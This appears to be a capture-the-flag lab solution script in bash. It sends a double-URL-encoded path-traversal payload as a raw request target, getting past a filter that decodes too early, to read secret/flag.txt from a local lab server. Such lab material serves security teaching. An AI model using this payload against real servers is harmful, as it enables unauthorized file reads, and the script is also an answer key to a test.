#!/usr/bin/env bash
# Lab 27 — the filter runs one decode too early, and the request-target has to
# reach the wire byte for byte for the payload to survive.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9270}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab27

open_lab "$SESSION" "$URL/download?file=welcome.md"

UP='%252e%252e%252f'

# What a normal, URL-parsing send does to the payload — kept in the record so
# the difference is visible rather than asserted.
send "$SESSION" "$REQ0" --set "query.file=${UP}secret%252fflag.txt" | body >&2; echo >&2

# The same bytes, written straight onto the request line.
send "$SESSION" "$REQ0" --raw-target "/download?file=${UP}secret%252fflag.txt" | flag
